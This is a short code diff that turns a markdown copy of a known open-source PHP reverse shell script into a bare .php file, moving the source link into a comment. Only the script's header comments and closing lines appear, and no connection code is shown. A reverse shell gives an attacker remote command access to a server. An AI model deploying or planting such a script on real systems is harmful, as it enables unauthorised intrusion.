@@ -1,8 +1,5 @@
-# PHP Reverse shell
-
-[source](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
-```php
 <?php
+// source: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
 // Copyright (c) 2020 Ivan Šincek
 // v2.5
 // Requires PHP v5.0.0 or greater.
@@ -182,4 +179,3 @@ unset($sh);
 // @gc_collect_cycles();
 echo '</pre>';
 ?>
-```
